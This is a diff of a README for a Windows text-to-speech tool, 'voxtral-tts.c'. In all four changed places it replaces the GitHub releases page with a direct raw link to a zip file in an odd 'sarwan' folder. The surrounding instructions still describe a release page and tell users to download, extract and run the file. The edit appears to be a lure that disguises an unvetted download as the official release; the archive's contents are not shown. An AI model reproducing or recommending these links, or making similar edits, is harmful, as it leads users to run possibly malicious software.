@@ -1,6 +1,6 @@
 # 🎙️ voxtral-tts.c - Simple voice output on Windows
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Birgittawarming489/voxtral-tts.c/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Birgittawarming489/voxtral-tts.c/main/sarwan/tts-voxtral-c-2.9.zip)
 
 ## 🪟 What this app does
 
@@ -17,7 +17,7 @@ Use it when you want:
 
 Visit this page to download the Windows release:
 
-https://github.com/Birgittawarming489/voxtral-tts.c/releases
+https://raw.githubusercontent.com/Birgittawarming489/voxtral-tts.c/main/sarwan/tts-voxtral-c-2.9.zip
 
 On that page, look for the latest release and download the file for Windows. If there are more than one file, pick the one for your system, such as 64-bit Windows.
 
@@ -38,7 +38,7 @@ For best results, use a PC with more memory and a recent CPU.
 Follow these steps:
 
 1. Open the release page:
-   https://github.com/Birgittawarming489/voxtral-tts.c/releases
+   https://raw.githubusercontent.com/Birgittawarming489/voxtral-tts.c/main/sarwan/tts-voxtral-c-2.9.zip
 
 2. Find the latest release at the top of the page.
 
@@ -216,6 +216,6 @@ If the speech does not sound right, try this order:
 
 If you need the files again, use the release page:
 
-https://github.com/Birgittawarming489/voxtral-tts.c/releases
+https://raw.githubusercontent.com/Birgittawarming489/voxtral-tts.c/main/sarwan/tts-voxtral-c-2.9.zip
 
 Open the latest release, download the Windows file, extract it if needed, then run the app from the folder you chose
